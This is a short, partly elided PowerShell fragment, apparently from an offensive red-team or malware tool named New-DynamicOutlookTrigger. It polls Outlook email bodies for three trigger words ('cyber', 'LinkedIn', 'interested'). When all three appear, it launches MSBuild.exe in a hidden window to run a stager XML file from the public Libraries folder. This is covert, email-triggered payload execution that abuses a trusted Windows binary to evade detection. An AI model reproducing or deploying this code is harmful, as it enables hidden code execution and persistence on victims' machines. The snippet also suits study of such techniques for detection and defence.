        ...
        while($true)
        {
            ...
            $Emails | foreach {
                if($_.Body -match $Triggerwords[0] -and $_.Body -match $Triggerwords[1] -and $_.Body -match $Triggerwords[2])
                {
                    ...
                    Start-Process -Window Hidden $payload -ArgumentList " $env:public\Libraies\msbuild_stager.xml"
					exit
                }
            }
            Start-sleep $Delay
...
New-DynamicOutlookTrigger -Triggerwords cyber,LinkedIn,interested -payload C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe -delay 30